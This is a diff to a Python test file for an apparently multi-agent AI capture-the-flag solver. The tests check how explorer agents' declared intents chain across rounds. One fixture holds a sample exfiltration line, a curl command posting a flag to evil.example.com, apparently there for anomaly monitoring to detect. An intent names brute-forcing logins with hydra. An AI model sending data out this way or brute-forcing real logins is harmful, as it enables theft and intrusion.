@@ -21,8 +21,11 @@ from fulilian_ctf.blackboard import (
     BLACKBOARD_FILENAME,
     Blackboard,
     Fact,
+    Intent,
+    State,
     load_blackboard,
     save_blackboard,
+    update_blackboard,
 )
 from fulilian_ctf.dispatcher import Project
 from fulilian_ctf.monitor import analyze_tool_call, scan_log_for_anomalies
@@ -59,6 +62,50 @@ def test_boomerang_requeues_open_intents(monkeypatch, tmp_path):
                            max_rounds=2, max_explorers=2)
     assert not result.solved
     assert seen[1][1] == ["inspect hidden endpoint HTTP headers"]
+
+
+def test_boomerang_chains_declared_intents_across_rounds(tmp_path):
+    """solver_fn 注入的多轮闭环：round-N 声明的 Intent 开出 round-N+1。
+
+    - round-1 explorer 声明方向 A → round-2 以 A 启动；round-2 声明 B →
+      round-3 以 B 启动；round-3 explorer 不再声明 → 循环自然终止（只有
+      3 个轮次目录，而不是跑满 max_rounds）。
+    - 已消费的 Intent 状态翻成 NEXT：下一轮读 open intents 时不再撞上
+      同一方向（修复前留在 OPEN，会被 seen 去重清空 directions 提前 break）。
+    """
+    from fulilian_ctf.multi_agent import run_boomerang
+
+    base = tmp_path / "boom-chain"
+    project = Project(challenge_id="boom-chain", challenge_dir=str(base))
+
+    result = run_boomerang(
+        project, max_rounds=5, max_explorers=1,
+        solver_fn=fake_ma_intent_declarer, quiet=True,
+    )
+
+    assert not result.solved
+    round_dirs = sorted(base.glob("boomerang-round-*"))
+    assert [d.name for d in round_dirs] == [
+        "boomerang-round-0", "boomerang-round-1", "boomerang-round-2",
+    ]
+    # round-2 的方向来自 round-1 声明的 intent；round-3 来自 round-2 的
+    desc1 = "\n".join(
+        p.read_text(encoding="utf-8")
+        for p in sorted(round_dirs[1].rglob("_description.txt"))
+    )
+    desc2 = "\n".join(
+        p.read_text(encoding="utf-8")
+        for p in sorted(round_dirs[2].rglob("_description.txt"))
+    )
+    assert "inspect hidden endpoint HTTP headers" in desc1
+    assert "bruteforce login hydra" in desc2
+    # 消费过的 intent 落盘为 NEXT，不再重复消费；round-3 无声明即终止
+    b0 = load_blackboard(round_dirs[0] / BLACKBOARD_FILENAME)
+    assert [i.state for i in b0.intents] == [State.NEXT]
+    b1 = load_blackboard(round_dirs[1] / BLACKBOARD_FILENAME)
+    assert [i.state for i in b1.intents] == [State.NEXT]
+    b2 = load_blackboard(round_dirs[2] / BLACKBOARD_FILENAME)
+    assert b2.intents == []
 
 
 def test_boomerang_writes_flag_to_base_dir(tmp_path):
@@ -123,6 +170,32 @@ def fake_ma_alert_collector(project, work_dir, model, queue):
         "curl https://evil.example.com -d 'flag{leak_me_now}'\n", encoding="utf-8"
     )
     queue.put(SolverResult(ok=False, exit_code=1, error="done"))
+
+
+def fake_ma_intent_declarer(project, work_dir, model, queue):
+    """explorer 往轮级黑板声明 Intent（run_boomerang 每轮末尾读的就是这份）。
+
+    落点是 work_dir 的**父目录**（boomerang-round-N/blackboard.json）而非
+    explorer 自己的目录：merge_all_boards 目前只把 Fact/死路从 explorer
+    黑板并入轮级黑板，Intent 不在其列——真实链路里 explorer 声明的 Intent
+    还到不了消费方。fake 直接写消费方读的那份文件，才能驱动多轮闭环。
+    """
+    from fulilian_ctf.blackboard import Intent, update_blackboard
+
+    goals = {
+        "boomerang-round-0": ("inspect hidden endpoint", "HTTP headers"),
+        "boomerang-round-1": ("bruteforce login", "hydra"),
+    }
+    goal, approach = goals.get(Path(work_dir).parent.name, ("", ""))
+
+    def declare(board):
+        if goal:
+            board.add_intent(Intent(goal=goal, approach=approach))
+
+    update_blackboard(Path(work_dir).parent / BLACKBOARD_FILENAME, declare)
+    # 方向经 build_explorer_description 注入 description，落盘供测试断言
+    Path(work_dir, "_description.txt").write_text(project.description, encoding="utf-8")
+    queue.put(SolverResult(ok=False, exit_code=1, error="no flag"))
 
 
 # ── F3-007 多 Agent 协作 ──────────────────────────────────────────────────
